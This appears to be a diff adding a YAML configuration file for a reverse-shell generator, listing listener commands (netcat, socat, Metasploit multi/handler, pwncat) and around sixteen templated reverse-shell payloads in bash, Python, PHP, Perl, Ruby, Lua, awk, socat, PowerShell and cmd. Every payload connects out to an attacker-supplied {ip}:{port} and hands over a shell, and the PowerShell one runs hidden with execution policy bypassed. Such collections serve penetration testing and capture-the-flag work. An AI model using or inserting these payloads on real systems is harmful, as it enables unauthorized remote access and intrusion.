@@ -1,0 +1,116 @@
+listeners:
+  nc:
+    name: Netcat
+    command: "nc -lvnp {port}"
+  rlwrap:
+    name: Netcat (rlwrap)
+    command: "rlwrap nc -lvnp {port}"
+  socat:
+    name: Socat
+    command: "socat file:`tty`,raw,echo=0 tcp-listen:{port},reuseaddr,fork"
+  socat_ssl:
+    name: Socat (SSL)
+    command: "socat openssl-listen:{port},reuseaddr,cert=server.pem,verify=0,fork stdio"
+  pwncat_vl:
+    name: pwncat-vl
+    command: "pwncat-vl -lp {port}"
+  pwncat_vl_win:
+    name: pwncat-vl (Windows)
+    command: "pwncat-vl -lp {port} --platform windows"
+  msf:
+    name: Metasploit
+    command: "msfconsole -q -x 'use multi/handler; set payload generic/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; run'"
+  rustcat:
+    name: Rustcat
+    command: "rc -lp {port}"
+  ncat_ssl:
+    name: Ncat (SSL)
+    command: "ncat --ssl -lvnp {port}"
+
+payloads:
+  bash:
+    name: Bash
+    platform: linux
+    payload: "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
+
+  bash_udp:
+    name: Bash (UDP)
+    platform: linux
+    payload: "bash -c 'bash -i >& /dev/udp/{ip}/{port} 0>&1'"
+
+  python:
+    name: Python
+    platform: linux
+    payload: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+
+  python_windows:
+    name: Python (Windows)
+    platform: windows
+    payload: "python3 -c \"import socket,subprocess;s=socket.socket();s.connect(('{ip}',{port}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)\""
+
+  nc_mkfifo:
+    name: Netcat (mkfifo)
+    platform: linux
+    payload: "mkfifo /tmp/f; nc {ip} {port} < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f"
+
+  nc_e:
+    name: Netcat (-e)
+    platform: linux
+    payload: "nc {ip} {port} -e /bin/sh"
+
+  nc_c:
+    name: Netcat (-c)
+    platform: linux
+    payload: "nc -c /bin/sh {ip} {port}"
+
+  php:
+    name: PHP
+    platform: linux
+    payload: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+  php_exec:
+    name: PHP (exec)
+    platform: linux
+    payload: "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
+
+  perl:
+    name: Perl
+    platform: linux
+    payload: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+
+  ruby:
+    name: Ruby
+    platform: linux
+    payload: "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+
+  lua:
+    name: Lua
+    platform: linux
+    payload: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
+
+  socat:
+    name: Socat
+    platform: linux
+    payload: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"
+
+  socat_ssl:
+    name: Socat (SSL)
+    platform: linux
+    payload: "socat openssl-connect:{ip}:{port},verify=0 exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+
+  awk:
+    name: AWK
+    platform: linux
+    payload: "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"$ \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c)}} }} while(c != \"exit\") close(s)}}'"
+
+  powershell:
+    name: PowerShell
+    platform: windows
+    payload: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\""
+
+
+  cmd:
+    name: CMD
+    platform: windows
+    payload: "cmd.exe /c nc {ip} {port} -e cmd.exe"
+    note: "Requires nc.exe on the target"
